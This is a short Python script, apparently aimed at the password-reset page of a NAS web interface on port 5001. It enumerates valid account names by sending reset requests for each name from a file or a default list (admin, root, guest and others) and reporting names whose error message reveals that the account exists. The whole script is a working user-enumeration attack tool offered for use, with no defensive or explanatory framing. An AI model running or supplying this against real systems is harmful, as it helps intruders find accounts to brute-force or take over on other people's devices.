import requests
import sys
import json

def showUsage():
    print "Usage: python "+sys.argv[0]+" target port usernames_file"
    exit()

def setArgs():
    global target,port,usernames
    try:
        target = sys.argv[1]
    except:
        showUsage()

    try:
        port = sys.argv[2]
    except:
        port = 5001

    try:
        usernames = open(sys.argv[3],'r').readlines()
        print "Trying "+str(len(usernames))+" usernames in file: " + str(sys.argv[3])
    except:
        print "Using default username list."
        usernames = [
                        "admin",
                        "administrator",
                        "root",
                        "nobody",
                        "ftp",
                        "guest"
                    ]

def getValidUsers():
    for user in usernames:
        user = user.strip()
        targetUrl = "http://"+target+":"+port+"/webman/forget_passwd.cgi?user="+user
        data = json.loads(requests.get(targetUrl).text)
        if (data['info'] == "no mail or no priviege"):
            print "Valid user found: " + user
        else:
            pass

if __name__ == "__main__":
    setArgs()
    getValidUsers()
